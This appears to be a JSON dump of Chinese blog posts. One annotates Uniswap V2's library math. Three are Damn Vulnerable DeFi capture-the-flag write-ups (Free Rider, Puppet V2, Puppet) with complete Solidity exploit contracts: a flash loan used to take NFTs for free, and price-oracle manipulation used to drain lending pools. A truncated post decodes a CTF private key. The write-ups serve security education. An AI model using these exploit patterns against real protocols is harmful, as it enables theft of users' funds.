msg.value 大于实际需要支付的金额，多余的部分将返还给用户 Library1. UniswapV2Library 代码解读如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122pragma solidity &gt;=0.5.0;import &#x27;@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol&#x27;;import &quot;./SafeMath.sol&quot;;library UniswapV2Library &#123; using SafeMath for uint; // returns sorted token addresses, used to handle return values from pairs sorted in this order // 给 tokenA和tokenB排序，按字面值排序 function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) &#123; require(tokenA != tokenB, &#x27;UniswapV2Library: IDENTICAL_ADDRESSES&#x27;); (token0, token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); require(token0 != address(0), &#x27;UniswapV2Library: ZERO_ADDRESS&#x27;); &#125; // calculates the CREATE2 address for a pair without making any external calls // 输入工厂地址和两个代币地址，计算这两个代币的交易对地址 function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) &#123; // 先对这两个代币地址进行排序 (address token0, address token1) = sortTokens(tokenA, tokenB); // 采用create2的方式计算地址 pair = address(uint(keccak256(abi.encodePacked( hex&#x27;ff&#x27;, factory, keccak256(abi.encodePacked(token0, token1)), // UniswapV2Pair 合约的 creationCode 的哈希值 hex&#x27;96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f&#x27; // init code hash )))); &#125; // fetches and sorts the reserves for a pair function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) &#123; // 先让 tokenA 和 tokenB 从小到大排列 (address token0,) = sortTokens(tokenA, tokenB); // 根据 `pairFor(factory, tokenA, tokenB)`算出一个新的地址 // .getReserves() 获取 该新地址的 reserve0，reserve1 (uint reserve0, uint reserve1,) = IUniswapV2Pair(pairFor(factory, tokenA, tokenB)).getReserves(); // 如果交换过顺序就交换输出，简单来说及时为了对应输入的形参 (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0); &#125; // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset /** 数量为amountA的代币A，按照合约中两种代币余额比例，换算成另一个代币B。此时不考虑手续费，因为仅是计价单位的换算 【根据给定的两个 token 的储备量和其中一个 token 数量，计算得到另一个 token 等值的数值】 */ function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) &#123; require(amountA &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_AMOUNT&#x27;); require(reserveA &gt; 0 &amp;&amp; reserveB &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;); amountB = amountA.mul(reserveB) / reserveA; &#125; // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset /** 该方法计算：输入一定数量（amountIn）代币A，根据池子中代币余额，能得到多少数量（amountOut）代币B。 amountIn指输入的代币A，reserveIn 指代币A的存储量，reserveOut指代币B的存储量 【根据给定的两个 token 的储备量和输入的 token 数量，计算得到输出的 token 数量，该计算会扣减掉 0.3% 的手续费】 */ function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) &#123; require(amountIn &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT&#x27;); require(reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;); uint amountInWithFee = amountIn.mul(997); uint numerator = amountInWithFee.mul(reserveOut); uint denominator = reserveIn.mul(1000).add(amountInWithFee); amountOut = numerator / denominator; &#125; // given an output amount of an asset and pair reserves, returns a required input amount of the other asset /** 该方法计算当希望获得一定数量（amountOut）的代币B时，应该输入多少数量（amoutnIn）的代币A。 amountOut指要得到的代币B，reserveIn 指代币A的存储量，reserveOut指代币B的存储量 【根据给定的两个 token 的储备量和输出的 token 数量，计算得到输入的 token 数量，该计算会扣减掉 0.3% 的手续费】 */ function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) &#123; require(amountOut &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT&#x27;); require(reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;); uint numerator = reserveIn.mul(amountOut).mul(1000); uint denominator = reserveOut.sub(amountOut).mul(997); amountIn = (numerator / denominator).add(1); &#125; // performs chained getAmountOut calculations on any number of pairs /** 该方法用于计算在使用多个交易对时，输入一定数量（amountIn）的第一种代币， 最终能收到多少数量的最后一种代币（amounts）。amounts数组中的第一个元素表示amountIn， 最后一个元素表示该目标代币对应的数量。该方法实际上是循环调用getAmountIn方法。 【根据兑换路径和输入数量，计算得到兑换路径中每个交易对的输出数量】 */ function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) &#123; require(path.length &gt;= 2, &#x27;UniswapV2Library: INVALID_PATH&#x27;); // 创建一个和path等长的uint数组 amounts = new uint[](path.length); amounts[0] = amountIn; for (uint i; i &lt; path.length - 1; i++) &#123; (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]); amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut); &#125; &#125; // performs chained getAmountIn calculations on any number of pairs /** 与getAmountsOut相对，getAmountsIn用于计算当希望收到一定数量（amountOut）的目标代币， 应该分别输入多少数量的中间代币。计算方法也是循环调用getAmountIn。 */ function getAmountsIn(address factory, uint amountOut, address[] memory path) internal view returns (uint[] memory amounts) &#123; require(path.length &gt;= 2, &#x27;UniswapV2Library: INVALID_PATH&#x27;); amounts = new uint[](path.length); amounts[amounts.length - 1] = amountOut; for (uint i = path.length - 1; i &gt; 0; i--) &#123; (uint reserveIn, uint reserveOut) = getReserves(factory, path[i - 1], path[i]); amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut); &#125; &#125;&#125; getAmountOut 的实现： 根据 AMM 的原理，恒定乘积公式「x * y &#x3D; K」，兑换前后 K 值不变。因此，在不考虑交易手续费的情况下，以下公式会成立： 1reserveIn * reserveOut = (reserveIn + amountIn) * (reserveOut - amountOut) 将公式右边的表达式展开，并推导下，就变成了： 12345reserveIn * reserveOut = reserveIn * reserveOut + amountIn * reserveOut - (reserveIn + amountIn) * amountOut-&gt;amountIn * reserveOut = (reserveIn + amountIn) * amountOut-&gt;amountOut = amountIn * reserveOut / (reserveIn + amountIn) 而实际上交易时，还需要扣减千分之三的交易手续费，所以实际上： 1amountIn = amountIn * 997 / 1000 代入上面的公式后，最终结果就变成了： 12345amountOut = (amountIn * 997 / 1000) * reserverOut / (reserveIn + amountIn * 997 / 1000)-&gt;amountOut = amountIn * 997 * reserveOut / 1000 * (reserveIn + amountIn * 997 / 1000)-&gt;amountOut = amountIn * 997 * reserveOut / (reserveIn * 1000 + amountIn * 997) 这即是最后代码实现中的计算公式了。 解读getAmountsOut 根据兑换路径和输入数量，计算得到兑换路径中每个交易对的输出数量。 举例： 假如一个交易地址数组 path[A,B,C,D] ，其中 pair(A,B)中的tokenA&#x3D;6，tokenB&#x3D;9； pair(B,C)中的tokenA&#x3D;10，tokenB&#x3D;8； pair(C,D)中的tokenA&#x3D;19，tokenB&#x3D;84 则 amounts[0] &#x3D; IN_tokenA, pair(A,B) : amount[1] &#x3D; getAmountOut(IN_tokenA, reserveA, reserveB), pair(B,C): amount[2] &#x3D; getAmountOut(IN_tokenA, reserveA, reserveB), pair(C,D): amount[3] &#x3D; getAmountOut(IN_tokenA, reserveA, reserveB). 该函数会计算 path 中每一个中间资产和最终资产的数量，比如 path 为 [A,B,C]，则会先将 A 兑换成 B，再将 B 兑换成 C。返回值则是一个数组，第一个元素是 A 的数量，即 amountIn，而第二个元素则是兑换到的代币 B 的数量，最后一个元素则是最终要兑换得到的代币 C 的数量。 从代码中还可看到，每一次兑换其实都调用了 getAmountOut 函数，这也意味着每一次中间兑换都会扣减千分之三的交易手续费。那如果兑换两次，实际支付假设为 1000，那最终实际兑换得到的价值只剩下： 11000 * (1 - 0.003) * (1 - 0.003) = 994.009 即实际支付的交易手续费将近千分之六了。兑换路径越长，实际扣减的交易手续费会更多，所以兑换路径一般不宜过长。 getAmountsIn同理 参考链接uniswap v2白皮书 链接1 uniswap v2代码 链接2 uiniswap v2代码core代码解读 链接3 登链社区","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"uniswap","slug":"DEFI/uniswap","permalink":"https://biyouqiuqiu.com/categories/DEFI/uniswap/"}],"tags":[{"name":"uniswap v2","slug":"uniswap-v2","permalink":"https://biyouqiuqiu.com/tags/uniswap-v2/"}]},{"title":"Free Rider","slug":"CTFS/damn defi/Free Rider","date":"2023-07-14T15:37:10.000Z","updated":"2023-07-14T15:37:10.000Z","comments":true,"path":"2023/07/14/CTFS/damn defi/Free Rider/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/14/CTFS/damn%20defi/Free%20Rider/","excerpt":"","text":"1. issue A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH. The developers behind it have been notified the marketplace is vulnerable. All tokens can be taken. Yet they have absolutely no idea how to do it. So they’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way. You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more. If only you could get free ETH, at least for an instant. 目标：将所有的 NFT 归还到卖家手里，获取赏金 题目链接 2. analysing本次挑战要求玩家有一定的 ERC721 和 uniswap v2 基础。 2.1 FreeRiderNFTMarketplace.sol如果对 ERC721 的每一个函数都比较清楚的话，不难看出在 _buyOne 函数中有一个明显的漏洞。 123456789101112131415161718192021222324252627282930function _buyOne(uint256 tokenId) private &#123; uint256 priceToPay = offers[tokenId]; if (priceToPay == 0) revert TokenNotOffered(tokenId); if (msg.value &lt; priceToPay) revert InsufficientPayment(); --offersCount; // transfer from seller to buyer DamnValuableNFT _token = token; // cache for gas savings /** 1. 在 ERC721 中的balance是货币的种类 2. _transfer(address from, address to, uint256 tokenId) 函数执行之后就会将 tokenId的所有权转交给 to 3. 此时执行 _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId)之后， msg.sender 就成为了该 tokenId的所有者 */ _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId); // pay seller using cached token /** 1. 这行代码的意思就是 msg.sender 向 _token.ownerOf(tokenId) 该tokenId的所有者支付费用priceToPay 2. 不难看出在 上一行代码中，卖家已经把tokenId先行卖给我了，我已经成为了该tokenId的主人 3. 所有这就是自己给自己支付priceToPay的ETH，简直太离谱 */ payable(_token.ownerOf(tokenId)).sendValue(priceToPay); emit NFTBought(msg.sender, tokenId, priceToPay);&#125; 归根结底，我们知道了可以免费购买 NTF，但首先我们得有 15 ETH才行，题中我们只有 0.1 ETH。 但是我们可以从 uniswap v2中通过闪电贷获取足够的 ETH. 1234567891011121314/** 思路： 1. 要通过 uniswapPair 中的swap函数借贷 15 WETH 用于购买NFT 1.1 求出 buymany 及其参数的 abi.encodeWithSignature(signatureString, arg); 1.2 将 15 WETH 转化成 15ETH, IWETH 1.3 需要有 receive函数 2. hacker需要实现 IUniswapV2Callee 的 uniswapV2Call 函数 2.1 在 uniswapV2Call 函数体中调用 marketplace 的buyMang函数 2.1.1 同时hacker需要实现IERC721Receiver接口 2.2 执行完 buyMany 函数之后，将 15ETH 转成 15WETH 还给 uniswapPair 2.3 此时 hacker成为了这 6种代币的主人 3. 通过 ERC721中的 safeTransferFrom 函数，获取赏金 */ 3. solving3.1 FreeRiderHack.sol123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &#x27;@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol&#x27;;import &#x27;@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol&#x27;;import &quot;./FreeRiderNFTMarketplace.sol&quot;;import &quot;../DamnValuableToken.sol&quot;;import &quot;../DamnValuableNFT.sol&quot;;import &quot;./FreeRiderRecovery.sol&quot;;import &quot;hardhat/console.sol&quot;;interface IERC20 &#123; function deposit() external payable; function approve(address spender, uint256 amount) external returns (bool); function balanceOf(address account) external returns (uint256); function withdraw(uint256 amount) external; function transfer(address to, uint256 amount) external returns (bool); function transferFrom( address from, address to, uint256 amount ) external returns (bool);&#125;contract FreeRiderHack is IUniswapV2Callee, IERC721Receiver&#123; IUniswapV2Pair uniswapPair; DamnValuableToken token; IERC20 weth; DamnValuableNFT nft; FreeRiderNFTMarketplace marketplace; FreeRiderRecovery recovery; uint256[] tokens = [0, 1, 2, 3, 4, 5]; constructor( address _uniswapPair, address _token, address _weth, address _nft, address payable _marketplace, address _recovery ) payable &#123; uniswapPair = IUniswapV2Pair(_uniswapPair); token = DamnValuableToken(_token); weth = IERC20(_weth); nft = DamnValuableNFT(_nft); marketplace = FreeRiderNFTMarketplace(_marketplace); recovery = FreeRiderRecovery(_recovery); &#125; function attack() external payable &#123; // 因为不确定 token 和 weth 在pair中的顺序，所以先判断 (uint amount0Out, uint amount1Out) = address(token) &gt; address(weth) ? (uint(15 ether), uint(0 ether)) :(uint(0 ether), uint(15 ether)); uniswapPair.swap( amount0Out, amount1Out, address(this), abi.encodeWithSignature(&quot;buyMany(uint256[])&quot;, tokens)); /** 此时 hacker 成为了 tokens 的拥有者, 且不欠 uniswapPair的钱 */ // 兑换赏金 for (uint256 i = 0; i &lt; tokens.length; i++) &#123; nft.safeTransferFrom( address(this), address(recovery), tokens[i], // 此处为了呼应 payable(abi.decode(_data, (address))).sendValue(PRIZE); abi.encode(msg.sender)); &#125; &#125; function uniswapV2Call(address, uint , uint , bytes calldata data) external &#123; // 记录hacker手中的ETH --- 15 ether uint amountETH = weth.balanceOf(address(this)); // 将WETH换成ETH weth.withdraw(amountETH); // 调用 buyMany 函数 address(marketplace).call&#123;value: amountETH&#125;(data); // 将手中的 ETH换成WETH, 并还回去 // woc 这里还要支付 0.3% 的手续费！！！ 也就是 0.045 uint repayAmount = amountETH * 1004 / 1000; weth.deposit&#123;value: repayAmount&#125;(); weth.transfer(address(uniswapPair), repayAmount); &#125; function onERC721Received( address , address , uint256 , bytes calldata ) external returns (bytes4)&#123; return IERC721Receiver.onERC721Received.selector; &#125; receive() external payable &#123;&#125;&#125; 这里我不知道为什么支付 0.3%的手续费不行，得需要支付更多才行 我选择了支付 0.4% uint repayAmount = amountETH * 1004 / 1000; 3.2 challenge.js123456789101112it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const hacker = await (await ethers.getContractFactory(&quot;FreeRiderHack&quot;, player)).deploy( uniswapPair.address, token.address, weth.address, nft.address, marketplace.address, devsContract.address ); await hacker.attack();&#125;); 解题成功。","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Puppet V2","slug":"CTFS/damn defi/Puppet V2","date":"2023-07-14T07:37:10.000Z","updated":"2023-07-14T07:37:10.000Z","comments":true,"path":"2023/07/14/CTFS/damn defi/Puppet V2/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/14/CTFS/damn%20defi/Puppet%20V2/","excerpt":"","text":"1. issue The developers of the previous pool seem to have learned the lesson. And released a new version! Now they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough. You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance. You know what to do. 要求：通过手中的 20 ETH 和 10000 DVT ，将池中的 100万个 DVT 代币取出来。 题目链接 2. analysing做这题是要求对 uniswap v2有一定的了解才行。 2.1 PuppetV2Pool.sol代码的分析如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384// SPDX-License-Identifier: MITpragma solidity ^0.6.0; import &quot;@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol&quot;;import &quot;@uniswap/v2-periphery/contracts/libraries/SafeMath.sol&quot;;interface IERC20 &#123; function transfer(address to, uint256 amount) external returns (bool); function transferFrom(address from, address to, uint256 amount) external returns (bool); function balanceOf(address account) external returns (uint256);&#125;/** * @title PuppetV2Pool * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz) */contract PuppetV2Pool &#123; using SafeMath for uint256; address private _uniswapPair; address private _uniswapFactory; IERC20 private _token; IERC20 private _weth; mapping(address =&gt; uint256) public deposits; event Borrowed(address indexed borrower, uint256 depositRequired, uint256 borrowAmount, uint256 timestamp); constructor(address wethAddress, address tokenAddress, address uniswapPairAddress, address uniswapFactoryAddress) public &#123; _weth = IERC20(wethAddress); _token = IERC20(tokenAddress); _uniswapPair = uniswapPairAddress; _uniswapFactory = uniswapFactoryAddress; &#125; /** * @notice Allows borrowing tokens by first depositing three times their value in WETH * Sender must have approved enough WETH in advance. * Calculations assume that WETH and borrowed token have same amount of decimals. */ function borrow(uint256 borrowAmount) external &#123; // Calculate how much WETH the user must deposit // 借 WETH 的押金 amount = borrowAmount * 10 ^ 18 * reservesWETH / reservesToken uint256 amount = calculateDepositOfWETHRequired(borrowAmount); // Take the WETH _weth.transferFrom(msg.sender, address(this), amount); // internal accounting deposits[msg.sender] += amount; require(_token.transfer(msg.sender, borrowAmount), &quot;Transfer failed&quot;); emit Borrowed(msg.sender, amount, borrowAmount, block.timestamp); &#125; function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) &#123; uint256 depositFactor = 3; return _getOracleQuote(tokenAmount).mul(depositFactor) / (1 ether); &#125; // Fetch the price from Uniswap v2 using the official libraries function _getOracleQuote(uint256 amount) private view returns (uint256) &#123; /** 1. address(_weth), address(_token) 不能相同 2. getReserves() 该函数的作用就是为了求出在 uniswap中各自对应的存储量 */ (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(_uniswapFactory, address(_weth), address(_token)); /** 1. amount 要求大于 0 2. reservesToken，reservesWETH 也要求大于0，也就是说要求在 uniswapv2中还有储备量 3. quote的计算源码： `amountA.mul(reserveB) / reserveA;` 3.1 代入本题：amount.mul(10 ** 18).mul(reservesWETH) / reservesToken 3.2 化简：amount * 10 ^ 18 * reservesWETH / reservesToken */ return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH); &#125;&#125; 简单的分析，发现和上一题大差不差。 押金 = borrowAmount * 10 ^ 18 * reservesWETH / reservesToken 其中的押金是由 reservesWETH 和 reservesToken 决定的，要么改变 reservesWETH 要么 改变 reservesToken，本题是改变 reservesWETH 。 题中已经给我们的 token 和 weth交易对注入一定的金额了 12const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n;const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n; 我们的任务就是将 UNISWAP_INITIAL_WETH_RESERVE的值尽可能的变小，我们可以通过UniswapV2Router02合约的 swapExactTokensForETH函数，将player全部的token在 交易对中尽可能的兑换多的WETH出来，从而降低我们的押金。 解题思路： 先通过 UniswapV2Router02 中的 swapExactTokensForETH消耗调 uniswapExchange中的 WETH 调用borrow函数 将hacker中的tokens转回player 3. solving3.1 PuppetV2Hack.sol123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990// SPDX-License-Identifier: MITpragma solidity ^0.6.0; import &#x27;@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol&#x27;;import &#x27;@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol&#x27;;import &#123;PuppetV2Pool&#125; from &quot;./PuppetV2Pool.sol&quot;;import &quot;hardhat/console.sol&quot;;interface IERC20 &#123; function deposit() external payable; function approve(address spender, uint256 amount) external returns (bool); function balanceOf(address account) external returns (uint256); function transfer(address to, uint256 amount) external returns (bool); function transferFrom( address from, address to, uint256 amount ) external returns (bool);&#125;/** 解题思路： 1. 先通过 UniswapV2Router02 中的 `swapExactTokensForETH`消耗调 uniswapExchange中的 WETH 1.1 player给hacker转入tokens 1.2 hacker给uniswapRouter授权 ---&gt; safeTransferFrom 1.3 根据token和weth创建一个数组 2. 调用borrow函数 2.1 将player的ETH转发给hacker 2.2 让hacker给pool授权，以此调用pool中的 transferFrom 2.3 调用borrow函数 2.4 将tokens转移到player */contract PuppetV2Hack &#123; IUniswapV2Router02 uniswapRouter; IERC20 token; PuppetV2Pool pool; IERC20 weth; address player; constructor( address _uniswapRouter, address _token, address _pool, address _weth) public &#123; uniswapRouter = IUniswapV2Router02(_uniswapRouter); token = IERC20(_token); pool = PuppetV2Pool(_pool); weth = IERC20(_weth); player = msg.sender; &#125; function attack() external payable &#123; // 获取player的token数量 uint256 tokenAmount = token.balanceOf(address(this)); token.approve(address(uniswapRouter), tokenAmount); // 创建数组 address[] memory path = new address[](2); path[0] = address(token); path[1] = address(weth); uniswapRouter.swapExactTokensForETH( tokenAmount, 1, path, address(this), uint256(block.timestamp + 150) ); // ETH 转 WETH weth.deposit&#123;value: address(this).balance&#125;(); // hacker给pool授权 weth.approve(address(pool), weth.balanceOf(address(this))); // 调用borrow函数 pool.borrow(token.balanceOf(address(pool))); // 将token转给token token.transfer(player, token.balanceOf(address(this))); &#125; // 涉及到转ETH的必须需要有这个接收函数 receive() external payable &#123;&#125;&#125; 3.2 challenge.js123456789it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const hacker = await (await ethers.getContractFactory(&#x27;PuppetV2Hack&#x27;, player)).deploy( uniswapRouter.address, token.address, lendingPool.address, weth.address ); await (await token.connect(player)).transfer(hacker.address, PLAYER_INITIAL_TOKEN_BALANCE); // 这里减掉 0.1ether是为了保证交易正常进行，支付交易所需的gas await hacker.attack(&#123;value: PLAYER_INITIAL_ETH_BALANCE - 1n * 10n ** 17n&#125;); &#125;); ![image-20230721232602837](Puppet V2&#x2F;image-20230721232602837.png) 解题成功。","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Puppet","slug":"CTFS/damn defi/Puppet","date":"2023-07-13T11:37:10.000Z","updated":"2023-07-13T11:37:10.000Z","comments":true,"path":"2023/07/13/CTFS/damn defi/Puppet/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/13/CTFS/damn%20defi/Puppet/","excerpt":"","text":"1. issue There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity. There’s a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity. Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance. 简单来说，凭借手中 25 ETH and 1000 DVTs，将 lending pool中的 DVTS 代币全部取出来。 题目链接 2. analysing2.1 PuppetPool.sol这道题只有一个合约，我们先阅读合约。 里面只有三个函数， 分别是： borrow、calculateDepositRequired、_computeOraclePrice borrow 123456789101112131415161718192021222324function borrow(uint256 amount, address recipient) external payable nonReentrant &#123; uint256 depositRequired = calculateDepositRequired(amount); // 押金 （DVT) if (msg.value &lt; depositRequired) revert NotEnoughCollateral(); if (msg.value &gt; depositRequired) &#123; // 支付的ETH 要大于押金 unchecked &#123; payable(msg.sender).sendValue(msg.value - depositRequired); &#125; &#125; unchecked &#123; deposits[msg.sender] += depositRequired; &#125; // Fails if the pool doesn&#x27;t have enough tokens in liquidity if(!token.transfer(recipient, amount)) revert TransferFailed(); emit Borrowed(msg.sender, recipient, depositRequired, amount); &#125; 函数很简单，就是 判断你支付的ETH 要大于押金，而且还有确保 pool中有足够的 DVTs可供借贷 if(!token.transfer(recipient, amount))。 calculateDepositRequired、_computeOraclePrice 这两个函数一块看 1234567891011// 计算押金 化简得 2 * amount * uniswapPair.balance / token.balanceOf(uniswapPair) function (uint256 amount) public view returns (uint256) &#123; return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18; &#125; // 计算每一个 token 对应多少 wei function _computeOraclePrice() private view returns (uint256) &#123; // calculates the price of the token in wei according to Uniswap pair return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair); &#125; 将这两个函数，利用数学代换式可以将 calculateDepositRequired的计算式看成 depositRequired = 2 * uniswapPair.balance / token.balanceOf(uniswapPair) 我们都知道，要想商最小，要么被除数越小，要么除数越大。 而题中 uniswapPair.balance 和 token.balanceOf(uniswapPair)都是 10 。题目还为我们提供了一个 uniswap v1我 手中有 25 ETH and 1000 DVTs，我可以试着和 uniswap进行交换，从而看看如何改变uniswap 的 uniswapPair.balance 或 token.balanceOf(uniswapPair)。 有一篇 文章能够帮助我们调用 uniswap v1的函数，比如 tokenToEthSwapOutput，函数功能：指定你需要兑换的 ETH数量并将ETH发送给指定接收者，函数根据要兑换的ETH计算扣除代币。 大佬的博客 3. solving3.1 PuppetHack.sol1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;../DamnValuableToken.sol&quot;;import &quot;./PuppetPool.sol&quot;;import &quot;hardhat/console.sol&quot;;interface IUniswapExchange &#123; function tokenToEthSwapOutput(uint256 eth_bought, uint256 max_tokens, uint256 deadline) external returns (uint256);&#125;contract PuppetHack &#123; DamnValuableToken token; IUniswapExchange uniswapExchange; PuppetPool pool; constructor(address _token, address _uniswapExchange, address _pool) &#123; token = DamnValuableToken(_token); uniswapExchange = IUniswapExchange(_uniswapExchange); pool = PuppetPool(_pool); &#125; function attack() external payable &#123; // console.log(&quot;msg.sender.balance&quot;,msg.sender.balance); // payable(address(this)).transfer(msg.sender.balance); // 记录我手中的代币数量 uint256 amount = token.balanceOf(address(this)); // 先给uniswapv1授权，允许它调用我们全部的token，此时授权者是hacker token.approve(address(uniswapExchange), amount); // 调用v1，用代币交换ETH uniswapExchange.tokenToEthSwapOutput(9.9 ether, amount, block.timestamp * 2); // 算一下现在把 pool中的token全部借出来要抵押多少 ETH uint256 depositRequired = pool.calculateDepositRequired(token.balanceOf(address(pool))); // 将全部的 token代币借出来 pool.borrow&#123;value: depositRequired, gas: 30000000&#125;(token.balanceOf(address(pool)), msg.sender); &#125; // 接收 v1 换出来的 ETH receive() external payable &#123;&#125;&#125; 3.2 challenge.js1234567891011121314it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const hacker = await (await ethers.getContractFactory(&#x27;PuppetHack&#x27;, player)).deploy( token.address, uniswapExchange.address, lendingPool.address); await token.connect(player).transfer(hacker.address, await token.balanceOf(player.address)); await player.sendTransaction(&#123; to: hacker.address, value: await ethers.utils.parseEther(&quot;11.0&quot;) &#125;); await hacker.attack(); &#125;); 要在一笔交易中完成。。。。。。(把题目改了就舒服多了) 先留着吧，等以后技术上来了，再试着把他们整合到一笔交易中。","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"From ASCII To  PrivateKey","slug":"Utils/Solidity/ASCII转私钥","date":"2023-07-13T04:47:10.000Z","updated":"2023-07-13T04:47:10.000Z","comments":true,"path":"2023/07/13/Utils/Solidity/ASCII转私钥/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/13/Utils/Solidity/ASCII%E8%BD%AC%E7%A7%81%E9%92%A5/","excerpt":"","text":"1. 前言主要是在 靶场 刷题的时候遇到的，题目要求 将一串ASCII码转为字符串，再将字符串解码为一串私钥。感觉很有趣，于是乎，便记录下来。 2. 题目一串已知的ASCII码 14d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35 3. 解法（JavaScript） 思路： 将其看作字符串，将字符串以空格为界限分割为数组，遍历数组，将数组中的每一个元素拼接一个 0x为了将其转为整型的时候代表着 16进制。最后将数组挨个遍历转化拼接。 实现代码 12345678910let code = &quot;4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35&quot;;let chars = code.split(&quot; &quot;)let result 